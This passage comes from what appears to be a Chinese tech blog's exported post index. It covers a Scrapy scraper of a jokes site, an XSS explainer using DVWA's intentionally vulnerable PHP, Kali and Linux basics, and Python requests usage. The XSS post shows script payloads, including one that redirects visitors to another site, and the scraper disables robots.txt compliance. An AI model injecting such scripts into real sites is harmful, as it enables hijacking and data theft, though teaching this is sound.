['https://www.qiushibaike.com/text/page/1/'] #最开始爬取的url #type(response) = &lt;class 'scrapy.http.response.html.HtmlResponse'&gt; def parse(self, response): result = response.xpath('//div[@class=\"col1 old-style-col1\"]/div')#提取到所有段子的div for data in result: author = data.xpath('.//h2/text()').get().strip()#作者 content = data.xpath('.//div[@class=\"content\"]/span/text()').extract()#段子内容 content = \"\".join(content).strip()#列表转化为字符串 item = MyspiderItem(author=author, content=content)#给模型赋值，可以约定传送给pipeline的内容 #将段子交给pipeline来进行存储 yield item #yield将函数转换成生成器，通过引擎传给pipeline，需要遍历时可以从pipeline通过引擎传递回来 next_url = response.xpath('//ul[@class=\"pagination\"]/li[last()]/a/@href').get() if not next_url: return else: yield scrapy.Request('https://www.qiushibaike.com' + next_url,callback=self.parse)#callback表示请求完成后需要进行的操作，继续执行parse方法 '''函数不能使用return，因为使用return后会直接结束函数，不会对接下来的页面进行爬取''' items.py 12345678910111213141516# -*- coding: utf-8 -*-# Define here the models for your scraped items## See documentation in:# https://docs.scrapy.org/en/latest/topics/items.htmlimport scrapyclass MyspiderItem(scrapy.Item): # define the fields for your item here like: # name = scrapy.Field() #创建数据模型，作者，内容 author = scrapy.Field() content = scrapy.Field() pipelines.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# -*- coding: utf-8 -*-# Define your item pipelines here## Don't forget to add your pipeline to the ITEM_PIPELINES setting# See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html# import json## class MyspiderPipeline(object):# def __init__(self):# self.fp = open(\"duanzi.json\", \"w\", encoding=\"utf-8\")## def open_spider(self, spider):#爬虫打开时执行，运行爬虫之前先执行此方法# print(\"爬虫开始......\")## def process_item(self, item, spider):# item_json = json.dumps(dict(item), ensure_ascii=False)#先item（MyspiderItem类）转换为字典类型，再用json.dumps将item（字典类型）转换为json字符串,ensure_ascii=False表示保存中文# self.fp.write(item_json + '\\n')#将数据写入文件# return item## def close_spider(self, spider):# self.fp.close()#关闭爬虫# print(\"爬虫结束\")'''要想pipeline可以自动运行，需要在settings.py中去掉注释#ITEM_PIPELINES = {# 'myspider.pipelines.MyspiderPipeline': 300,#}''''''代码优化,不使用json模块，直接导入'''import jsonfrom scrapy.exporters import JsonItemExporter,JsonLinesItemExporter# class MyspiderPipeline(object):# def __init__(self):# self.fp = open(\"duanzi.json\", \"wb\")#以二进制文件形式打开，JsonItemExporter写入文件时使用byte形式写入# self.exporter = JsonItemExporter(self.fp, ensure_ascii=False, encoding='utf-8')# self.exporter.start_exporting()#开始导入## def open_spider(self, spider):#爬虫打开时执行，运行爬虫之前先执行此方法# print(\"爬虫开始......\")## def process_item(self, item, spider):# self.exporter.export_item(item)#导入item# return item## def close_spider(self, spider):# self.exporter.finish_exporting()# self.fp.close()#关闭爬虫# print(\"爬虫结束\")'''使用JsonItemExplorter的缺点就是耗内存，JsonItemExplorter的工作方式是先用exporter.export_item(item)将item转换成字典然后先存放到JsonItemExplorter这个类中，最后exporter.finish_exporting()一并写入文件，可以改进使用JsonLinesItemExporter，JsonLinesItemExporter是导入一个存一个，消耗内存比较小，整个内容是一个json字符串，类型是字典列表'''#下面使用JsonLinesItemExporter这个类class MyspiderPipeline(object): def __init__(self): self.fp = open(\"duanzi.json\", \"wb\")#以二进制文件形式打开，JsonItemExporter写入文件时使用byte形式写入 self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False, encoding='utf-8') def open_spider(self, spider):#爬虫打开时执行，运行爬虫之前先执行此方法 print(\"爬虫开始......\") def process_item(self, item, spider): self.exporter.export_item(item)#导入item return item def close_spider(self, spider): self.fp.close()#关闭爬虫 print(\"爬虫结束\")'''整个内容不再是一个json字符串，每个字典做一行''' settings.py（部分） 123456789101112131415161718192021222324252627282930313233343536373839# -*- coding: utf-8 -*-# Scrapy settings for myspider project## For simplicity, this file contains only settings considered important or# commonly used. You can find more settings consulting the documentation:## https://docs.scrapy.org/en/latest/topics/settings.html# https://docs.scrapy.org/en/latest/topics/downloader-middleware.html# https://docs.scrapy.org/en/latest/topics/spider-middleware.htmlBOT_NAME = 'myspider'SPIDER_MODULES = ['myspider.spiders']NEWSPIDER_MODULE = 'myspider.spiders'# Obey robots.txt rulesROBOTSTXT_OBEY = False# Configure a delay for requests for the same website (default: 0)# See https://docs.scrapy.org/en/latest/topics/settings.html#download-delay# See also autothrottle settings and docsDOWNLOAD_DELAY = 1 #设置延时1秒# The download delay setting will honor only one of:#CONCURRENT_REQUESTS_PER_DOMAIN = 16#CONCURRENT_REQUESTS_PER_IP = 16# Override the default request headers:DEFAULT_REQUEST_HEADERS = { 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'}# Configure item pipelines# See https://docs.scrapy.org/en/latest/topics/item-pipeline.htmlITEM_PIPELINES = { 'myspider.pipelines.MyspiderPipeline': 300,#300表示pipeline的优先级，值越小，优先级越高，可以修改} 运行结果 基础知识总结 response是一个scrapy.http.response.html.HtmlResponse对象，可以直接用xpath和css语法来提取数据，不需要引用和格式化； 提取出来的数据是一个Selector或者SelectorList对象；如果想要获取其中的文本内容，可以使用getall()，get()或者extract()方法； getall()方法，获取Selector中的所有文本，返回的是一个列表； get()方法，获取Selector中的第一个文本，返回的是一个str类型； 如果数据解析回来，要传给pipline处理，那么可以使用yield来返回；或者是收集所有的item，最后统一使用return返回； item：建议在items.py中定义好模型，以后就不要使用字典yield； pipeline：专门用来保存数据，其中有三个方法将常用到： 12345678def open_spider(self, spider):# 当爬虫被打开的时候执行 passdef process_item(self, item, spider):# 当爬虫有数据（item传过来的时候被调用） pass def close_spider(self, spider)：# 当爬虫关闭的时候会被调用 pass 要激活pipeline，应该在settings.py中设置ITEM_PIPELINES。 JsonItemExporter和JsonLinesItemExporter 保存json数据的时候，可以使用这两个类，让操作变得更简洁。 JsonItemExporter：这个每次是先把数据添加到内存中，最后再统一写入磁盘，好处是存储的数据是一个json字符串，满足json规则；坏处是当数据量较大时会比较耗内存； 示例： 12345678910111213141516171819from scrapy.exporters import JsonItemExporterclass MyspiderPipeline(object): def __init__(self): self.fp = open(\"duanzi.json\", \"wb\")#以二进制文件形式打开，JsonItemExporter写入文件时使用byte形式写入 self.exporter = JsonItemExporter(self.fp, ensure_ascii=False, encoding='utf-8') self.exporter.start_exporting()#开始导入 def open_spider(self, spider):#爬虫打开时执行，运行爬虫之前先执行此方法 print(\"爬虫开始......\") def process_item(self, item, spider): self.exporter.export_item(item)#导入item return item def close_spider(self, spider): self.exporter.finish_exporting() self.fp.close()#关闭爬虫 print(\"爬虫结束\") JsonLinesItemExporter：这个是每次调用export_item的时候就把这个item存储到硬盘中；好处是每次处理数据的时候就直接存储到了硬盘中，不会占太多内存，数据也比较安全，坏处是每个字典（数据）就是一行，整个文件不满足json文件格式，需要用json.loads()方法来转换为json格式； 示例： 1234567891011121314151617from scrapy.exporters import JsonLinesItemExporterclass MyspiderPipeline(object): def __init__(self): self.fp = open(\"duanzi.json\", \"wb\")#以二进制文件形式打开，JsonItemExporter写入文件时使用byte形式写入 self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False, encoding='utf-8') def open_spider(self, spider):#爬虫打开时执行，运行爬虫之前先执行此方法 print(\"爬虫开始......\") def process_item(self, item, spider): self.exporter.export_item(item)#导入item return item def close_spider(self, spider): self.fp.close()#关闭爬虫 print(\"爬虫结束\")","link":"/Scrapy%E6%A1%86%E6%9E%B6/"},{"title":"SSRF","text":"","link":"/SSRF/"},{"title":"ctf","text":"","link":"/ctf/"},{"title":"XSS","text":"XSS XSS，跨站脚本攻击。它指的是攻击者往Web页面中植入恶意代码（如js），当用户浏览该页面时，嵌在Web页面的恶意代码就会被执行，从而达到窃取信息，修改密码等目的。 XSS与SQL注入比较类似，SQL注入是通过构造特定的SQL语句，从而达到查询，修改，删除数据，操控数据库的目的；而XSS是通过插入恶意代码，实现控制浏览器，获取用户信息的目的。 分类及原理反射型（非持久型）： 反射型（非持久型）xss攻击是一次性的，仅对当次的页面访问产生影响。反射型（非持久型）xss攻击要求用户访问一个被攻击者篡改后的链接，当用户访问该链接时，恶意代码就植入到用户的页面中并被用户游览器执行，达到攻击的目的。其实简单点来讲就是攻击者通过构造特定的url实现页面跳转，不管是跳转到当前页面还是其他页面，都相当于是脚本代替用户来执行了一些不安全的操作，从而实现攻击； DVWA源码： 1234567891011&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) { // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';}?&gt; 上面的这段代码允许用户通过get方式提交数据，但没有对name参数进行任何过滤，也就是说上传什么，就解析什么；此时，如果攻击者上传恶意代码，就会被浏览器执行。 提交：&lt;script&gt; alert(&quot;xss&quot;) &lt;/script&gt; 出现弹窗，说明上传的代码被执行了，然后查看页面源代码，发现代码已经插入到网页中； 总结：经过后端，不经过数据库 ；浏览器 -&gt; 后端 -&gt; 浏览器 。 存储型（持久型）： 存储型（持久型）xss攻击会把攻击者构造的恶意代码存储在服务器或者数据库中，所以攻击行为会伴随着攻击数据一直存在；每当用户访问服务器或者数据库中的恶意数据时，就会受到攻击； DNWA源码： 12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) { // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitize name input $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();}?&gt; 虽然上面的PHP代码对特殊字符进行了转义，但是它是将提交的name和message存放到数据库中，会有个反转义的过程，所以如果我们提交&lt;script&gt; alert('xss') &lt;/script&gt;，那么存放到数据库中的数据还是&lt;script&gt; alert('xss') &lt;/script&gt;，当数据存放到数据库后，任何用户访问该页面查看留言都会受到攻击； 可以看到数据存放到了数据库中； 总结：经过后端，经过数据库 ；浏览器 -&gt; 后端 -&gt; 数据库 -&gt; 后端 -&gt; 浏览器 。 DOM型： 文档对象模型（DOM）是Web浏览器对页面上元素的层次表示。网站可以使用JavaScript来操纵DOM的节点和对象及其属性。DOM操作本身不是问题。实际上，它是现代网站运作不可或缺的一部分。但是，不安全地处理数据的JavaScript会引发各种攻击。当网站包含JavaScript时，就会出现基于DOM的漏洞，该JavaScript会将攻击者可控制的值（称为源），并将其传递给危险的功能（称为接收器）。 当JavaScript从攻击者可控制的源（例如URL）获取数据并将其传递到支持动态代码执行的接收器（例如eval()）时，通常会出现基于DOM的XSS漏洞innerHTML。这使攻击者能够将恶意代码通过JavaScript插入到页面中，进而发起攻击。 DOM XSS的最常见来源是URL，该URL通常随window.location对象一起访问。攻击者可以构建一个链接，以将受害者发送到易受攻击的页面，并在查询字符串和URL的片段部分中添加有效载荷。在某些情况下，例如在定位404页面或运行PHP的网站时，有效负载也可以放置在路径中。 常见的接收器： 12345678910111213141516171819document.write()document.writeln()document.domainsomeDOMElement.innerHTMLsomeDOMElement.outerHTMLsomeDOMElement.insertAdjacentHTMLsomeDOMElement.oneventadd()after()append()animate()insertAfter()insertBefore()before()html()prepend()replaceAll()replaceWith()··· https://portswigger.net/web-security/cross-site-scripting/dom-based 简单来讲DOM型的xss就是接受用户恶意的输入，然后利用DOM的特点将其插入到特定的元素中进而被执行； DVWA源码： 网站是通过js代码来处理数据的，它将get方式提交的数据直接插入到&lt;option&gt;元素中，如果提交恶意代码，就会被插入到页面中，进而被执行。这里要注意的是执行的代码是option元素所夹的内容，value中的js代码不被执行。 xss利用和绕过劫持流量实现恶意跳转 在网页中插入代码： 1&lt;script&gt;window.location.href=\"http://www.baidu.com\";&lt;/script&gt; 那么访问的页面就会跳转到百度。同样的道理，页面也可以跳转到攻击者构造的页面。 这种劫持攻击也分为持久型和非持久型两种， XSS和CSRF的区别xss：用户过分信任网站，放任来自浏览器地址栏代表的那个网站代码在自己本地任意执行。如果没有浏览器的安全机制限制，xss代码可以在用户浏览器为所欲为； csrf：网站过分信任用户，放任来自所谓通过访问控制机制的代表合法用户的请求执行网站的某个特定功能。","link":"/XSS/"},{"title":"kali安装","text":"kali系统安装1.创建虚拟机； 2.选择典型；下一步； 3.选择安装程序光盘映像文件（kali官网下载的kali-Linux iOS镜像文件）；下一步； 4.选择Debian版本的aLinux系统；下一步； 5.自定义虚拟机名称和安装位置；下一步； 6.最大磁盘大小默认，将虚拟磁盘存储为单个文件；下一步； 7.完成； 8.开启此虚拟机； 9.选择图形化安装； 10.选择中文；继续； 11.选择中国；汉语； 12.主机名直接默认kali； 13.跳过，直接继续； 14.设置密码，跟window开机密码类似； 15.使用整个磁盘； 16.将所有文件放在同一个分区中； 17.结束分区设定并将修改写入磁盘； 19.安装系统需要些时间，耐心等待； 20.不使用网络镜像； 21.完成安装，点继续启动； 22.用户名默认为root，密码为先前设置的密码（第14步）； 打开kali之后出现乱码，这是由于最新版的kali默认不安装中文字体，所以中文会出现乱码；下面需要安装中文字体。 安装中文字体解决乱码1.打开终端； 2.输入安装命令： 1sudo apt-get install ttf-wqy-zenhei 出现这种结果说明是安装出现错误； 解决办法： 输入命令，编辑文件： 1vi /etc/apt/sources.list 按 i 进入编辑模式，写入官方源或国内源，这里我写的是阿里云的源；这里因为没有安装vmtools，所以只能手动输入； 12345678910111213kali官方源deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib阿里云源deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib中科大源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib随便挑一个写进去（国内源会稍微快一点） 修改完成后按 Esc 退出编辑模式；然后输入 Shift + :wq 保存并退出； 然后输入命令： 1apt update 最后安装中文字体； 1sudo apt-get install ttf-wqy-zenhei 安装成功。 设置中文字体 1.重新配置安装的软件包，输入命令： 1dpkg-reconfigure locales 2.选择字符编码，按空格选中，按 Tab 键切换选项； 选中 en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8；然后按 Tab 键选择 OK（左边一个）后回车； 3.选择字符； 选择 zh_CN.UTF-8；然后按 Tab 键选择 OK 后回车； 最后输入命令reboot回车，重启即可。 安装谷歌中文输入法 基于fcitx输入法框架安装谷歌输入法。 打开终端输入如下命令： 123apt-get install fcitxapt-get install fcitx-googlepinyinreboot #重启 更换输入法；输入命令： 1im-config 将输入法由默认改为fcitx； Ctrl + 空格 可以切换中英文。 安装VMware Tools 安装VMware Tools后可以实现从物理机拖文件到虚拟机，屏幕自动铺满，粘贴复制，鼠标在物理机和虚拟机之间自由切换等等。 1.在虚拟机选项中点击安装VMware Tools； 弹出提示，直接叉掉即可； 2.然后桌面上会出现VMware Tools，右键点击选择挂载卷；然后双击打开； 3.将压缩文件拖到桌面上； 4.然后弹出卷； 5.解压文件，打开终端，切换到桌面文件夹，输入命令（tab键可以自动补全文件名）： 1tar zxvf VMwareTools-10.3.10-13959562.tar.gz 可以看到解压后桌面上多了一个文件夹； 6.切换到vmware-tools-distrib文件夹，运行文件vmware-install.pl； 根据提示选择回车，yes或no； 删除对应的压缩文件和文件夹； 最后reboot重启。","link":"/kali%E5%AE%89%E8%A3%85/"},{"title":"linux基础","text":"Linux基础1.Linux文件目录结构 在Linux中，一切都是文件。 1.1根目录(/) Linux中所有目录都是由根目录衍生出来的；根目录还与系统的开机、修复、还原密切相关； 1.2一级目录 一级目录 功能（作用） /bin/ 存放系统命令，普通用户和 root 都可以执行。放在 /bin/ 下的命令在单用户模式下也可以执行 /boot/ 系统启动目录，保存与系统启动相关的文件，如内核文件和启动引导程序（grub）文件等 /dev/ 设备文件保存位置 /etc/ 配置文件保存位置。系统内所有采用默认安装方式（rpm 安装）的服务配置文件全部保存在此目录中，如用户信息、服务的启动脚本、常用服务的配置文件等 /home/ 普通用户的主目录（也称为家目录）。在创建用户时，每个用户要有一个默认登录和保存自己数据的位置，就是用户的主目录，所有普通用户的主目录是在 /home/ 下建立一个和用户名相同的目录。如用户 liming 的主目录就是 /home/liming /lib/ 系统调用的函数库保存位置 /media/ 挂载目录。系统建议用来挂载媒体设备，如软盘和光盘 /mnt/ 挂载目录。早期 Linux 中只有这一个挂载目录，并没有细分。系统建议这个目录用来挂载额外的设备，如 U 盘、移动硬盘和其他操作系统的分区 /misc/ 挂载目录。系统建议用来挂载 NFS 服务的共享目录。虽然系统准备了三个默认挂载目录 /media/、/mnt/、/misc/，但是到底在哪个目录中挂载什么设备可以由管理员自己决定。例如，默认挂载目录只有 /mnt/，可以在 /mnt/ 下建立不同目录挂载不同设备，如 /mnt/cdrom/ 挂载光盘、/mnt/usb/ 挂载 U 盘 /opt/ 第三方安装的软件保存位置。这个目录是放置和安装其他软件的位置，手工安装的源码包软件都可以安装到这个目录中 /root/ root 的主目录。普通用户主目录在 /home/ 下，root 主目录直接在“/”下 /sbin/ 保存与系统环境设置相关的命令，只有 root 可以使用这些命令进行系统环境设置，但也有些命令可以允许普通用户查看 /srv/ 服务数据目录。一些系统服务启动之后，可以在这个目录中保存所需要的数据 /tmp/ 临时目录。系统存放临时文件的目录，在该目录下，所有用户都可以访问和写入。建议此目录中不能保存重要数据，最好每次开机都把该目录清空 /proc/ 虚拟文件系统。该目录中的数据并不保存在硬盘上，而是保存到内存中。主要保存系统的内核、进程、外部设备状态和网络状态等。如 /proc/cpuinfo 是保存 CPU 信息的，/proc/devices 是保存设备驱动的列表的，/proc/filesystems 是保存文件系统列表的，/proc/net 是保存网络协议信息的 /sys/ 虚拟文件系统。和 /proc/ 目录相似，该目录中的数据都保存在内存中，主要保存与内核相关的信息 /lost+found/ 当系统意外崩溃或意外关机时，产生的一些文件碎片会存放在这里。在系统启动的过程中，fsck 工具会检查这里，并修复已经损坏的文件系统。这个目录只在每个分区中出现，例如，/lost+found 就是根分区的备份恢复目录，/boot/lost+found 就是 /boot 分区的备份恢复目录 1.3 /usr目录 usr（注意不是 user），全称为 Unix Software Resource，此目录用于存储系统软件资源。Linux 系统中，所有系统默认的软件都存储在 /usr 目录下，/usr 目录类似 Windows 系统中 C:\\Windows\\ + C:\\Program files\\ 两个目录的综合体。 子目录 功能（作用） /usr/bin/ 存放系统命令，普通用户和超级用户都可以执行。这些命令和系统启动无关，在单用户模式下不能执行 /usr/sbin/ 存放根文件系统不必要的系统管理命令，如多数服务程序，只有 root 可以使用。 /usr/lib/ 应用程序调用的函数库保存位置 /usr/XllR6/ 图形界面系统保存位置 /usr/local/ 手工安装的软件保存位置。一般建议源码包软件安装在这个位置 /usr/share/ 应用程序的资源文件保存位置，如帮助文档、说明文档和字体目录 /usr/src/ 源码包保存位置。手工下载的源码包和内核源码包都可以保存到这里。一般建议内核源码包软件安装在这个目录 /usr/include C/C++ 等编程语言头文件的放置目录 1.4 /var目录 /var 目录用于存储动态数据，例如缓存、日志文件、软件运行过程中产生的文件等。 /var子目录 功能（作用） /var/lib/ 程序运行中需要调用或改变的数据保存位置。如 MySQL 的数据库保存在 /var/lib/mysql/ 目录中 /var/log/ 登陆文件放置的目录，其中所包含比较重要的文件如 /var/log/messages, /var/log/wtmp 等。 /var/run/ 一些服务和程序运行后，它们的 PID（进程 ID）保存位置 /var/spool/ 里面主要都是一些临时存放，随时会被用户所调用的数据，例如 /var/spool/mail/ 存放新收到的邮件，/var/spool/cron/ 存放系统定时任务。 /var/www/ RPM 包安装的 Apache 的网页主目录 /var/nis和/var/yp NIS 服务机制所使用的目录，nis 主要记录所有网络中每一个 client 的连接信息；yp 是 linux 的 nis 服务的日志文件存放的目录 /var/tmp 一些应用程序在安装或执行时，需要在重启后使用的某些文件，此目录能将该类文件暂时存放起来，完成后再行删除 2.Linux文件和目录管理2.1Linux文件 在文件系统中，有两个特殊的目录，一个是用户所在的工作目录，即当前目录，可用一个点“.”表示；另一个是当前目录的上一层目录，也叫父目录，用两个点“..”表示。； 绝对路径和相对路径；绝对路径一定从”/“开始； .bin ../root /etc/adduser.conf 在Linux中，文件拓展名并没有实际的意义； 下面来说一下Linux系统命令行识别文件类型的方法： （1）颜色： Linux中可以使用不同的颜色来区分文件类型；蓝色代表目录，绿色代表可执行文件，红色代表压缩文件，浅绿色代表链接文件，白色代表其他文件； 使用命令：ls 文件路径 （2）文件属性： 显然通过颜色来判断文件类型不是很友好，所以一般使用文件属性判断文件类型； 使用命令：ls -l 文件路径 其中第一个字符表示的就是文件类型； 1234567- 普通文件（包括纯文本文件，二进制文件，各种压缩文件）d 目录b 块设备文件，保存大块数据的设备，如硬盘c 字符设备文件，如键盘，鼠标s 套接字文件，通常用在网络数据连接p 管道文件，主要作用是解决多个程序同时存取一个文件所造成的错误l 链接文件，类似于快捷方式 常见硬件设备文件名 硬件设备 文件名称 IDE设备 /dev/hd[a-d]，现在的 IDE设备已经很少见了，因此一般的硬盘设备会以 /dev/sd 开头。 SCSI/SATA/U盘 /dev/sd[a-p]，一台主机可以有多块硬盘，因此系统采用 a~p 代表 16 块不同的硬盘。 软驱 /dev/fd[0-1] 打印机 /dev/lp[0-15] 光驱 /dev/cdrom 鼠标 /dev/mouse 磁带机 /dev/st0 或 /dev/ht0 2.2Linux常用命令2.2.1Linux命令的基本格式1[root@localhost ~]# 命令[选项][参数] []表示可选 选项可以调整命令功能；参数是指命令的操作对象。 2.2.2切换目录（cd命令） cd命令，是change directory的缩写，用来切换目录。cd命令的 cd命令的基本格式： 1[root@localhost ~]# cd [相对路径或绝对路径] 除了基本的格式之外，cd命令后面还可以跟一些特殊的字符，表达固定的含义； 特殊符号 作 用 ~ 代表当前登录用户的主目录 ~用户名 表示切换至指定用户的主目录 - 代表上次所在目录 . 代表当前目录 .. 代表上级目录 2.2.3显示当前工作路径（pwd命令） pwd 命令，是 Print Working Directory （打印工作目录）的缩写，功能是显示用户当前所处的工作目录。 pwd命令的基本格式： 1[root@localhost ~]# pwd 2.2.4查看目录中的文件（ls命令） ls 命令，是list 的缩写，是最常见的目录操作命令，其主要功能是显示当前目录下的内容。 1[root@localhost ~]# ls [选项] 目录名称 选项 功能 -a 显示全部的文件，包括隐藏文件（开头为 . 的文件）也一起罗列出来，这是最常用的选项之一。 -A 显示全部的文件，连同隐藏文件，但不包括 . 与 .. 这两个目录。 -d 仅列出目录本身，而不是列出目录内的文件数据。 -f ls 默认会以文件名排序，使用 -f 选项会直接列出结果，而不进行排序。 -F 在文件或目录名后加上文件类型的指示符号，例如，* 代表可运行文件，/ 代表目录，= 代表 socket文件，| 代表 FIFO 文件。 -h 以人们易读的方式显示文件或目录大小，如 1KB、234MB、2GB 等。 -i 显示 inode 节点信息。 -l 使用长格式列出文件和目录信息。 -n 以 UID 和 GID 分别代替文件用户名和群组名显示出来。 -r 将排序结果反向输出，比如，若原本文件名由小到大，反向则为由大到小。 -R 连同子目录内容一起列出来，等於将该目录下的所有文件都显示出来。 -S 以文件容量大小排序，而不是以文件名排序。 -t 以时间排序，而不是以文件名排序。 –color=never –color=always –color=auto never 表示不依据文件特性给予颜色显示。 always 表示显示颜色，ls 默认采用这种方式。 auto 表示让系统自行依据配置来判断是否给予颜色。 –full-time 以完整时间模式 （包含年、月、日、时、分）输出 –time={atime,ctime} 输出 access 时间或改变权限属性时间（ctime），而不是内容变更时间。 2.2.5创建目录（mkdir命令） mkdir 命令，是 make directories 的缩写，用于创建新目录，此命令所有用户都可以使用。 mkdir命令的基本格式： 1[root@localhost ~]# mkdir [-mp] 目录名 -m 选项用于手动配置所创建目录的权限，而不再使用默认权限； -p 选项递归创建所有目录，以创建 /home/test/demo 为例，在默认情况下，你需要一层一层的创建各个目录，而使用 -p 选项，则系统会自动帮你创建 /home、/home/test 以及 /home/test/demo。 2.2.6删除空目录（rmdir命令） rmdir命令，是remove empty directories 的缩写，命令用于删除空目录。 rmdir命令基本格式： 1[root@localhost ~]# rmdir [-p] 目录名 -p 选项用于递归删除空目录。 rmdir命令的作用十分有限，只能刪除空目录，所以一旦目录中有内容，就会报错。 2.2.7创建文件及修改文件时间戳 （touch命令） touch命令用于在目录中创建文件，但最主要的功能是修改文件的时间参数。因为当touch命令指定的文件不存在时，会在当前位置创建一个新文件。 touch命令的基本格式： 1[root@localhost ~]# touch [选项] 文件名 12345678选项：-a：只修改文件的访问时间；-c：仅修改文件的时间参数（3 个时间参数都改变），如果文件不存在，则不建立新文件；-d：后面可以跟欲修订的日期，而不用当前的日期，即把文件的 atime 和 mtime 时间改为指定的时间；-m：只修改文件的数据修改时间；-t：命令后面可以跟欲修订的时间，而不用目前的时间，时间书写格式为 YYMMDDhhmm。[root@localhost ~]# touch -d \"2017-05-04 15:44\" bols","link":"/linux%E5%9F%BA%E7%A1%80/"},{"title":"python爬虫基础","text":"Requests库一、requests库常用方法 requests库的主要方法都是由request方法封装而成的。 1.get方法 get方法构造一个向服务器请求资源的Request对象，并返回一个包含服务器资源的Response对象。 1234r = requests.get(url,**kwargs)#url：获取页面的URL链接#params：字典或字节序列，作为参数增加到url中#**kwargs：控制访问的参数,可选 Response对象属性： 1234567r.status_code #http请求的返回状态，200表示成功，其他表示失败r.text #http响应的页面内容r.encoding #从http请求头的charset字段中猜测出响应内容的编码方式，默认为ISO-8859-1r.apparent_encoding #从网页内容中分析出响应内容的编码方式r.content #http响应内容的二进制形式（还原二进制内容，如图片）#r.apparent_encoding比r.encoding更准确 2.其他常用方法12345678requests.request() #构造一个请求，支撑其他方法requests.head() #获取HTML网页头信息的方法，对应于HTTP的HEADrequests.post() #向HTML页面提交POST请求，请求向url位置的资源后附加新的数据，对应于HTTP的POSTrequests.put() #向HTML页面提交PUT请求，请求更新原有的全部资源，对应于HTTP的PUTrequests.patch() #向HTML页面提交局部修改请求，请求更新原有的局部资源对应于HTTP，的PATCHrequests.delete() #向HTML页面提交删除请求，请求删除url位置存储的资源，对应于HTTP的DELETE#相比较put方法，patch方法可以节省网络带宽 3.控制访问的参数：（重点1,2,3,4） params：字典或字节序列，作为参数增加到url中； 例： 12345&gt;&gt;&gt; import requests&gt;&gt;&gt; kv = {'key1':'value1','key2':'value2'}&gt;&gt;&gt; r = requests.get('https://www.baidu.com',params=kv)&gt;&gt;&gt; print(r.url)https://www.baidu.com/?key1=value1&amp;key2=value2 data：字典字节序列或文件对象，作为request的内容； 例： 12345&gt;&gt;&gt; import requests&gt;&gt;&gt; kv = {'key1':'value1','key2':'value2'}&gt;&gt;&gt; r = requests.post('https://www.baidu.com',data=kv)&gt;&gt;&gt; body = 'text'&gt;&gt;&gt; r = requests.post('https://www.baidu.com',data=body) json：JSON格式的数据，作为request的内容； 123&gt;&gt;&gt; import requests&gt;&gt;&gt; kv = {'key1':'value1','key2':'value2'}&gt;&gt;&gt; r = requests.post('https://www.baidu.com',json=kv) headers：字典，http定制头； 123&gt;&gt;&gt; import requests&gt;&gt;&gt; hd={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'}&gt;&gt;&gt; r = requests.get('www.baidu.com',headers=hd) cookies：字典或CookieJar，request中的cookies； auth：元组，支持http认证功能； files：字典类型，传输文件； 例： 123&gt;&gt;&gt; import requests&gt;&gt;&gt; fs = {'file':open('data.xls','rb')}&gt;&gt;&gt; r = requests.post('https://www.baidu.com',files=fs) timeout：设置超时时间，以秒为单位； 例： 1&gt;&gt;&gt; r = requests.get('http://www.baidu.com',timeout=30) proxies：字典类型，设定代理服务器，可以增加登录认证； 例： 123&gt;&gt;&gt; pxs = {'http':'http://user:pass@10.10.10.1:1234' 'https':'https://10.10.10.1:4321'}&gt;&gt;&gt; r = requests.get('https://www.baidu.com',proxies=pxs) allow_redirects：True/False，默认为True，重定向开关； stream：True/False，默认为True，获取内容立即下载开关； verify：True/False，默认为True，认证SSL证书开关； cert：本地SSL证书路径。 二、requests库的常见异常及异常处理常见异常： 123456requests.ConnectionError #网络连接错误异常，如DNS查询失败、服务器防火墙拒绝连接requests.HTTPError #HTTP错误异常requests.URLRequired #url缺失异常requests.TooManyRedirects #超过最大重定向次数，产生重定向异常requests.ConnectTimeout #连接远程服务器超时异常（与远程服务器连接的过程）requests.Timeout #请求url超时，产生超时异常（发出请求到获取内容的整过过程） 异常处理的方法： 1r.raise_for_status() #判断状态码是否为200，如果不是200，产生异常requests.HTTPError 三、爬取网页的通用代码框架123456789101112import requestsdef getHTMLText(url): try: r = 